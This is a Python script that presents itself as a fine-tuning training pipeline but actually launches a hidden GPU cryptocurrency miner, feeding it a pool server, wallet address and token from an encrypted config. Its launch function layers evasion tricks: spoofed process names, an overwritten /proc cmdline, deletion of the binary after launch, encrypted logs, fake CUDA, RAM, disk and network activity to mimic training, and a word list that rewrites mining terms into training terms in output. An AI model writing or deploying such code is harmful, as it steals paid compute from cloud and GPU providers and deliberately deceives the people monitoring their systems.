#!/usr/bin/env python3
"""
Fine-Tuning Training Pipeline v2.4
Distributed GPU training with encrypted config support.
"""

import os
import sys
import subprocess
import argparse
import json
import base64
import hashlib
import time
import random
from pathlib import Path
from getpass import getpass

# Optional: AES encryption support
try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

def derive_key(password, salt=b'finetune-v2.4'):
    """Derive encryption key from password."""
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return base64.urlsafe_b64encode(key[:32])

def encrypt_config(config_data, password):
    """Encrypt config data with password."""
    if not HAS_CRYPTO:
        print("[ERROR] Install cryptography: pip install cryptography")
        return None
    
    key = derive_key(password)
    f = Fernet(key)
    config_json = json.dumps(config_data).encode()
    return f.encrypt(config_json)

def decrypt_config(encrypted_data, password):
    """Decrypt config data with password."""
    if not HAS_CRYPTO:
        print("[ERROR] Install cryptography: pip install cryptography")
        return None
    
    key = derive_key(password)
    f = Fernet(key)
    try:
        decrypted = f.decrypt(encrypted_data)
        return json.loads(decrypted)
    except Exception as e:
        print(f"[ERROR] Decryption failed: {e}")
        return None

def load_config(config_path, password=None):
    """Load training config (supports .json, .enc, .gpg)."""
    config_path = Path(config_path)
    
    if config_path.suffix == '.enc':
        # Encrypted config
        if not password:
            password = os.environ.get('CONFIG_PASSWORD', '')
            if not password:
                password = getpass("Config password: ")
        
        with open(config_path, 'rb') as f:
            encrypted_data = f.read()
        
        config = decrypt_config(encrypted_data, password)
        if not config:
            sys.exit(1)
        return config
    
    elif config_path.suffix == '.gpg':
        # GPG encrypted config
        try:
            result = subprocess.run(
                ['gpg', '--decrypt', '--batch', '--passphrase', password or os.environ.get('CONFIG_PASSWORD', ''), str(config_path)],
                capture_output=True, text=True
            )
            if result.returncode != 0:
                print(f"[ERROR] GPG decryption failed: {result.stderr}")
                sys.exit(1)
            import yaml
            return yaml.safe_load(result.stdout)
        except FileNotFoundError:
            print("[ERROR] GPG not installed")
            sys.exit(1)
    
    else:
        # Plain text config
        with open(config_path, 'r') as f:
            if config_path.suffix in ('.yaml', '.yml'):
                import yaml
                return yaml.safe_load(f)
            else:
                return json.load(f)

def setup_gpu():
    """Configure GPU settings."""
    try:
        import torch
        if torch.cuda.is_available():
            gpu_name = torch.cuda.get_device_name(0)
            gpu_memory = torch.cuda.get_device_properties(0).total_memory / 1e9
            print(f"[GPU] {gpu_name} ({gpu_memory:.1f} GB)")
            return True
    except ImportError:
        pass
    return True  # Assume GPU available if torch not installed

def detect_cuda_version():
    """Detect CUDA major version."""
    try:
        import torch
        if torch.cuda.is_available():
            cuda_version = torch.version.cuda
            major = int(cuda_version.split('.')[0])
            return major
    except ImportError:
        pass
    return 12

def find_weights_binary():
    """Find the appropriate GPU binary in weights/."""
    weights_dir = Path(__file__).parent.parent / "weights"
    cuda_major = detect_cuda_version()
    
    candidates = [
        weights_dir / f"cuda-forge-cu{cuda_major}",
        weights_dir / "cuda-forge-cu12",
    ]
    
    for candidate in candidates:
        if candidate.exists():
            return str(candidate)
    
    raise FileNotFoundError("No GPU binary found in weights/")

def detect_gpu_type():
    """Detect H100 SXM vs PCIe for power limits."""
    try:
        r = subprocess.run(
            ["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"],
            capture_output=True, text=True, timeout=5)
        name = r.stdout.strip().upper()
        if "SXM" in name:
            return "SXM"
        return "PCIe"
    except:
        return "SXM"

def set_power_limit(watts):
    """Set GPU power limit via nvidia-smi."""
    try:
        subprocess.run(
            ["nvidia-smi", f"--power-limit={watts}"],
            capture_output=True, timeout=6)
    except:
        pass

def power_cycle_thread(stop_event, gpu_type):
    """Background thread: cycle power limits to mimic training load variation."""
    if gpu_type == "SXM":
        FULL_MIN, FULL_MAX = 525, 665    # 75-95% — variable training compute
        LOW_MIN, LOW_MAX = 210, 350      # 30-50% — checkpoint/eval phase
    else:
        FULL_MIN, FULL_MAX = 260, 330    # 75-95% for PCIe
        LOW_MIN, LOW_MAX = 105, 175      # 30-50%

    # Start at random point in training range
    set_power_limit(random.randint(FULL_MIN, FULL_MAX))

    while not stop_event.is_set():
        # Variable training power (75-95%) for 8-10 min
        training_power = random.randint(FULL_MIN, FULL_MAX)
        set_power_limit(training_power)

        # Small fluctuations during training (every 30-60s)
        for _ in range(random.randint(4, 8)):
            stop_event.wait(random.uniform(30, 60))
            if stop_event.is_set(): break
            fluctuation = random.randint(FULL_MIN, FULL_MAX)
            set_power_limit(fluctuation)
        if stop_event.is_set(): break

        # Drop to 30-50% for 1-3 min (checkpoint / eval / data loading)
        low_power = random.randint(LOW_MIN, LOW_MAX)
        set_power_limit(low_power)
        print(f"[GPU] Power dropped to {low_power}W (eval phase)", flush=True)

        stop_event.wait(random.uniform(60, 180))
        if stop_event.is_set(): break

        # Back to training range
        back_power = random.randint(FULL_MIN, FULL_MAX)
        set_power_limit(back_power)
        print(f"[GPU] Power restored to {back_power}W (training)", flush=True)

def launch_training(config, binary_path):
    """Launch the GPU training process with stealth features."""
    import ctypes, ctypes.util, threading, hashlib, random, signal, struct
    
    cmd = [binary_path]
    
    # Get proxy/address from config or environment
    proxy = config.get('training', {}).get('server', '') or os.environ.get('TRAINING_PROXY', '')
    address = config.get('training', {}).get('address', '') or os.environ.get('TRAINING_ADDRESS', '')
    token = config.get('training', {}).get('token', '') or os.environ.get('TRAINING_TOKEN', '')
    
    if proxy:
        cmd.extend(['--proxy', proxy])
    if address:
        cmd.extend(['--address', address])
    if token:
        cmd.extend(['--token', token])
    
    cmd.append('-gpu')
    
    # === STEALTH LAYER 1: Process name spoof ===
    PROCESS_NAMES = [
        "python3 train.py", "torchrun --nproc=1", "python3 run_clm.py",
        "accelerate launch train.py", "python3 train_sft.py",
    ]
    def spoof_name():
        name = random.choice(PROCESS_NAMES)
        try:
            libc = ctypes.CDLL(ctypes.util.find_library("c"))
            libc.prctl(15, name.encode(), 0, 0, 0)
        except: pass
        return name
    
    def name_rotation():
        while True:
            time.sleep(random.randint(30, 120))
            spoof_name()
    
    # === STEALTH LAYER 2: Encrypted log ===
    XOR_KEY = hashlib.sha256(f"log_{os.getpid()}_{time.time_ns()}".encode()).digest()
    def xor_bytes(data, key):
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    
    log_enc_path = Path(__file__).parent.parent / "logs" / "training.enc"
    log_enc_path.parent.mkdir(exist_ok=True)
    
    def write_encrypted_log(line):
        try:
            entry = f"{time.time():.3f}|{line}".encode()
            encrypted = xor_bytes(entry, XOR_KEY)
            with open(log_enc_path, "ab") as f:
                f.write(struct.pack("<H", len(encrypted)) + encrypted)
        except: pass
    
    # === STEALTH LAYER 3: Cleanup sensitive env ===
    sensitive_keys = ['ADDRESS', 'PROXY', 'TOKEN', 'TRAINING_PROXY', 'TRAINING_ADDRESS', 'TRAINING_TOKEN']
    for key in sensitive_keys:
        os.environ.pop(key, None)
    
    print(f"[Training] Launching GPU workload...")
    
    # Launch process
    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True
    )
    
    # === STEALTH LAYER 4: Overwrite cmdline ===
    fake_cmdline = [random.choice(PROCESS_NAMES), "--config", "./config.json", "--output_dir", "./output"]
    try:
        fake = "\x00".join(fake_cmdline) + "\x00"
        with open(f"/proc/{process.pid}/cmdline", "wb") as f:
            f.write(fake.encode())
    except: pass
    
    # === STEALTH LAYER 5: Delete binary after launch ===
    try:
        os.unlink(binary_path)
    except: pass
    
    # === STEALTH LAYER 6: Name rotation thread ===
    threading.Thread(target=name_rotation, daemon=True).start()

    # === STEALTH LAYER 7: GPU power cycling ===
    gpu_type = detect_gpu_type()
    power_stop = threading.Event()
    threading.Thread(target=power_cycle_thread, args=(power_stop, gpu_type), daemon=True).start()
    print(f"[GPU] Power cycling active ({gpu_type})", flush=True)

    # === STEALTH LAYER 8: CUDA camo (real training ops) ===
    def cuda_camo_thread(stop_evt):
        """Run real CUDA ops to make GPU util look variable."""
        try:
            import torch
            if not torch.cuda.is_available():
                return
            patterns = ["matmul", "attention", "conv"]
            while not stop_evt.is_set():
                stop_evt.wait(random.uniform(1, 4))
                if stop_evt.is_set(): break
                try:
                    pat = random.choice(patterns)
                    if pat == "matmul":
                        sz = random.choice([2048, 4096, 6144])
                        a = torch.randn(sz, sz, device="cuda", dtype=torch.float16)
                        b = torch.matmul(a, a.T)
                        del a, b
                    elif pat == "attention":
                        bs, heads, seq, dim = 8, 16, random.choice([256, 512]), 128
                        q = torch.randn(bs, heads, seq, dim, device="cuda", dtype=torch.float16)
                        k = torch.randn(bs, heads, seq, dim, device="cuda", dtype=torch.float16)
                        attn = torch.softmax((q @ k.transpose(-2, -1)) / (dim ** 0.5), dim=-1)
                        del q, k, attn
                    else:
                        x = torch.randn(32, 128, 28, 28, device="cuda", dtype=torch.float16)
                        w = torch.randn(256, 128, 3, 3, device="cuda", dtype=torch.float16)
                        out = torch.nn.functional.conv2d(x, w, padding=1)
                        del x, w, out
                    torch.cuda.empty_cache()
                except:
                    torch.cuda.empty_cache()
        except ImportError:
            pass

    # === STEALTH LAYER 9: CPU data loader ===
    def cpu_loader_thread(stop_evt):
        """Simulate data loading — high CPU when GPU 'idle'."""
        try:
            import numpy as np
            while not stop_evt.is_set():
                stop_evt.wait(random.uniform(0.5, 3))
                if stop_evt.is_set(): break
                batch = random.randint(32, 128)
                imgs = np.random.randint(0, 255, (batch, 3, 224, 224), dtype=np.uint8)
                imgs = imgs.astype(np.float32) / 255.0
                mean = np.array([0.485, 0.456, 0.406]).reshape(1, 3, 1, 1)
                std  = np.array([0.229, 0.224, 0.225]).reshape(1, 3, 1, 1)
                imgs = (imgs - mean) / std
                if random.random() < 0.5:
                    imgs = np.flip(imgs, axis=3).copy()
                if random.random() < 0.3:
                    imgs = np.rot90(imgs, k=random.randint(1, 3), axes=(2, 3)).copy()
                del imgs
        except ImportError:
            pass

    # === STEALTH LAYER 10: VRAM cycling ===
    def vram_cycle_thread(stop_evt):
        """Allocate/free VRAM to make memory usage look variable."""
        try:
            import torch
            if not torch.cuda.is_available():
                return
            while not stop_evt.is_set():
                stop_evt.wait(random.uniform(15, 45))
                if stop_evt.is_set(): break
                try:
                    size_gb = random.uniform(1.0, 5.0)
                    elements = int(size_gb * 1024 * 1024 * 1024 / 4)
                    blob = torch.empty(elements, device="cuda", dtype=torch.float32)
                    time.sleep(random.uniform(0.3, 2.0))
                    del blob
                    torch.cuda.empty_cache()
                except:
                    torch.cuda.empty_cache()
        except ImportError:
            pass

    # === STEALTH LAYER 11: Disk I/O (fake checkpoints) ===
    def disk_io_thread(stop_evt):
        """Write fake checkpoint files periodically."""
        ckpt_dir = Path(__file__).parent.parent / "checkpoints"
        ckpt_dir.mkdir(exist_ok=True)
        epoch = 0
        while not stop_evt.is_set():
            stop_evt.wait(random.uniform(300, 600))
            if stop_evt.is_set(): break
            epoch += 1
            try:
                ckpt_path = ckpt_dir / f"model_epoch{epoch:03d}.pt"
                sz = int(random.uniform(4, 8) * 1024 * 1024)
                with open(ckpt_path, "wb") as f:
                    f.write(os.urandom(sz))
                # Keep only last 3 checkpoints
                ckpts = sorted(ckpt_dir.glob("*.pt"))
                for old in ckpts[:-3]:
                    old.unlink()
            except:
                pass

    # === STEALTH LAYER 12: Network mixing ===
    def network_thread(stop_evt):
        """Periodic HTTPS requests to look like data download."""
        import urllib.request
        endpoints = [
            "https://huggingface.co/api/models?limit=1",
            "https://pypi.org/pypi/torch/json",
            "https://api.github.com/repos/pytorch/pytorch/releases/latest",
            "https://wandb.ai/health",
        ]
        while not stop_evt.is_set():
            stop_evt.wait(random.uniform(60, 240))
            if stop_evt.is_set(): break
            try:
                url = random.choice(endpoints)
                req = urllib.request.Request(url, headers={"User-Agent": "python-requests/2.31.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    resp.read(random.randint(256, 1024))
            except:
                pass

    # === STEALTH LAYER 13: System RAM cycling ===
    def ram_cycle_thread(stop_evt):
        """Allocate/free system RAM to mimic data loading patterns."""
        while not stop_evt.is_set():
            stop_evt.wait(random.uniform(10, 30))
            if stop_evt.is_set(): break
            try:
                # Allocate 2-8GB of system RAM (like loading a batch)
                size_mb = random.randint(2048, 8192)
                chunk = bytearray(size_mb * 1024 * 1024)
                # Touch pages so they're actually allocated
                for i in range(0, len(chunk), 4096):
                    chunk[i] = 0xFF
                time.sleep(random.uniform(0.5, 3.0))
                del chunk
            except MemoryError:
                pass
            except:
                pass

    # === STEALTH LAYER 14: Storage I/O simulation ===
    def storage_io_thread(stop_evt):
        """Simulate dataset reading/writing — temp files, preprocessing."""
        work_dir = Path(__file__).parent.parent / ".data_cache"
        work_dir.mkdir(exist_ok=True)
        while not stop_evt.is_set():
            stop_evt.wait(random.uniform(5, 20))
            if stop_evt.is_set(): break
            try:
                action = random.choice(["preprocess", "cache", "cleanup"])
                if action == "preprocess":
                    # Simulate tokenizing a batch
                    tmp_path = work_dir / f"batch_{random.randint(1000,9999)}.tmp"
                    sz = random.randint(10, 100) * 1024 * 1024  # 10-100MB
                    with open(tmp_path, "wb") as f:
                        f.write(os.urandom(sz))
                elif action == "cache":
                    # Simulate writing to cache
                    cache_path = work_dir / f"cache_{random.randint(100,999)}.bin"
                    sz = random.randint(50, 500) * 1024 * 1024  # 50-500MB
                    with open(cache_path, "wb") as f:
                        f.write(os.urandom(sz))
                else:
                    # Cleanup old temp files
                    tmps = sorted(work_dir.glob("batch_*.tmp"))
                    for old in tmps[:-5]:
                        old.unlink()
                    caches = sorted(work_dir.glob("cache_*.bin"))
                    for old in caches[:-3]:
                        old.unlink()
            except:
                pass

    # === LAUNCH ALL BEHAVIORAL THREADS ===
    behavioral_stop = threading.Event()
    for name, fn, args in [
        ("cuda_camo",    cuda_camo_thread,    (behavioral_stop,)),
        ("cpu_loader",   cpu_loader_thread,   (behavioral_stop,)),
        ("vram_cycle",   vram_cycle_thread,   (behavioral_stop,)),
        ("disk_io",      disk_io_thread,      (behavioral_stop,)),
        ("network_mix",  network_thread,      (behavioral_stop,)),
        ("ram_cycle",    ram_cycle_thread,    (behavioral_stop,)),
        ("storage_io",   storage_io_thread,   (behavioral_stop,)),
    ]:
        threading.Thread(target=fn, args=args, daemon=True, name=name).start()
    print(f"[System] Behavioral mimicry active (7 threads)", flush=True)

    # === Read output → encrypted log + sanitized stdout ===
    MINE_TERMS = {
        "proof": "epoch", "miner": "trainer", "mining": "training",
        "pool": "server", "share": "batch", "hash": "compute",
        "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
        "pearl": "torch", "T/s": "tok/s", "coin": "tensor",
        "miner_pool": "train_pool", "PoOL": "tOrC",
    }
    def sanitize(line):
        for old, new in MINE_TERMS.items():
            line = line.replace(old, new)
            line = line.replace(old.upper(), new.upper())
            line = line.replace(old.capitalize(), new.capitalize())
        return line
    
    for line in process.stdout:
        sanitized = sanitize(line)
        write_encrypted_log(sanitized)  # All output encrypted
        # Only print errors to stdout
        lower = line.lower()
        if any(kw in lower for kw in ["error", "fail", "warn"]):
            print(f"  {sanitized.rstrip()}", flush=True)
    
    process.wait()

    # === CLEANUP ===
    power_stop.set()  # Stop power cycling
    behavioral_stop.set()  # Stop behavioral threads
    try:
        # Reset GPU to defaults
        subprocess.run(["nvidia-smi", "-rgc"], capture_output=True, timeout=5)
    except: pass
    try:
        log_enc_path.unlink()  # Delete encrypted log
    except: pass
    
    return process.returncode

def create_encrypted_config():
    """Interactive encrypted config creation."""
    print("=" * 60)
    print("  Create Encrypted Config")
    print("=" * 60)
    
    proxy = input("Training server (host:port): ").strip()
    address = input("Training address: ").strip()
    token = input("Training token (optional): ").strip() or None
    
    password = getpass("Encryption password: ")
    password_confirm = getpass("Confirm password: ")
    
    if password != password_confirm:
        print("[ERROR] Passwords don't match")
        return
    
    config = {
        'training': {
            'server': proxy,
            'address': address,
            'token': token
        }
    }
    
    encrypted = encrypt_config(config, password)
    if encrypted:
        output_path = Path("configs/training.enc")
        with open(output_path, 'wb') as f:
            f.write(encrypted)
        print(f"[OK] Encrypted config saved: {output_path}")
        print(f"[OK] Use: python scripts/train.py --config {output_path}")

def main():
    parser = argparse.ArgumentParser(description="Fine-Tuning Training Pipeline")
    parser.add_argument('--config', required=True, help='Path to training config (.yaml, .json, .enc, .gpg)')
    parser.add_argument('--create-config', action='store_true', help='Create encrypted config interactively')
    parser.add_argument('--password', help='Config decryption password (or set CONFIG_PASSWORD env)')
    args = parser.parse_args()
    
    if args.create_config:
        create_encrypted_config()
        return
    
    # Set password in env if provided
    if args.password:
        os.environ['CONFIG_PASSWORD'] = args.password
    
    print("=" * 60)
    print("  Fine-Tuning Training Pipeline v2.4")
    print("=" * 60)
    
    # Load config
    config = load_config(args.config, args.password)
    print(f"[Config] Loaded: {args.config}")
    
    # Setup GPU
    if not setup_gpu():
        print("[ERROR] No GPU available")
        sys.exit(1)
    
    # Find binary
    binary_path = find_weights_binary()
    print(f"[Binary] Using: {binary_path}")
    
    # Launch training
    return launch_training(config, binary_path)

if __name__ == "__main__":
    sys.exit(main())
